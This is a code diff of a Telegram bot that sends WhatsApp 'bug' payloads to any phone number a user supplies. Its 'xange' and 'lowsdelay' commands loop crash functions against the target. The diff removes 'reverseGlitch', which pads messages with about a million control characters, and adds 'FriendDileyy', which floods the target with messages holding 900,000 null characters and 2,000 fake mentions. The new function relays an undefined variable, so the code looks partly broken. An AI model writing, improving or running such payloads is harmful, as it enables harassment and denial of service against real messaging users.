@@ -2317,9 +2317,6 @@ bot.command("lowsdelay", checkAllPremium, checkWhatsAppConnection, async (ctx) =
 
   (async () => {
     for (let i = 0; i < 5; i++) {
-  await FrZinTrS(sock, target);
-  await sleep(1500);
-  
   await delayGabuts(sock,target);
   await sleep(3000);
     }
@@ -2327,14 +2324,15 @@ bot.command("lowsdelay", checkAllPremium, checkWhatsAppConnection, async (ctx) =
 }); 
 /// CASE BUG 6 \\\
 bot.command("xange", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
-  const q = ctx.message.text.split(" ")[1];
-  if (!q) return ctx.reply(`🪧 ☇ Example : /xange 62xxxx`);
-  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 
+  const q = ctx.message.text.split(" ")[1]; 
+  if (!q) return ctx.reply("🪧 ☇ Example : /xange 62xx");
+
+  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
   await ctx.reply(
 
 `
-🚀 SUCCES MENGIRIM BUGS TO : ${q}`,
+<blockquote>✅ SUCCES SENDING BUGS TO : ${q}</blockquote>`,
   {
     parse_mode: "HTML",
     reply_markup: {
@@ -2344,9 +2342,9 @@ bot.command("xange", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
     },
   });
 
-  for (let i = 0; i < 20; i++) {
-    await reverseGlitch(sock, target);
-    await sleep(1000)
+  for (let r = 0; r < 75; r++) {
+    await FriendDileyy(sock, target);
+    await sleep(500)
     }
 })
 /// --------- ( CASE BUG 7 ) ---------- \\\
@@ -2827,83 +2825,36 @@ async function SuperDelay(sock, target) {
  await sock.relayMessage(target, { groupStatusMessageV2: { message: msg.message } }, { participant: { jid: target } });
 }
 
-async function reverseGlitch(sock, target) {
-  const msg1 = {
-    viewOnceMessage: {
-      message: {
-        interactiveResponseMessage: {
-          body: {
-            text: "A - r - T"
-          },
-          nativeFlowResponseMessage: {
-            name: "address_message",
-            paramsJson: "\x10".repeat(1030000),
-            version: 3
-          }
+async function FriendDileyy(sock, target, mention = true) {
+  for (let r = 0; r < 75; r++) {
+   const ViSI = generateWAMessageFromContent(target, {
+      interactiveResponseMessage: {
+        contextInfo: {
+          mentionedJid: Array.from({ length: 2000 }, (_, r) => `6285983729${r + 1}@s.whatsapp.net`)
+        },
+        body: {
+          text: "TELEGRAM VISI ML",
+          format: "DEFAULT"
+        },
+        nativeFlowResponseMessage: {
+          name: "galaxy_message",
+          paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
+          version: 3
         }
       }
-    }
-  };
-
-  const msg2 = {
-    viewOnceMessage: {
-      message: {
-        interactiveResponseMessage: {
-          body: {
-            text: "A - r - T"
-          },
-          nativeFlowResponseMessage: {
-            name: "call_permission_request",
-            paramsJson: "\x10".repeat(1030000),
-            version: 3
-          }
+    }, {});
+    
+    await sock.relayMessage(
+      target,
+      {
+        groupStatusMessageV2: {
+          message: Gua.message
         }
-      }
-    }
-  };
-
-  const msg3 = {
-    viewOnceMessage: {
-      message: {
-        interactiveResponseMessage: {
-          body: {
-            text: "A - r - T"
-          },
-          nativeFlowResponseMessage: {
-            name: "address_message",
-            paramsJson: "\x10".repeat(1030000),
-            version: 3
-          }
-        }
-      }
-    }
-  };
-
-  for (let i = 0; i < 20; i++) {
-    for (const msg of [msg1, msg2, msg3]) {
-      await sock.relayMessage(
-        "status@broadcast",
-        msg,
-        {
-          messageId: null,
-          statusJidList: [target],
-          additionalNodes: [{
-            tag: "meta",
-            attrs: {},
-            content: [{
-              tag: "mentioned_users",
-              attrs: {},
-              content: [{
-                tag: "to",
-                attrs: {
-                  jid: target
-                }
-              }]
-            }]
-          }]
-        }
-      );
-    }
+      },
+      mention
+        ? { messageId: Gua.key.id, participant: { jid: target } }
+        : { messageId: Gua.key.id }
+    );
   }
 }
 
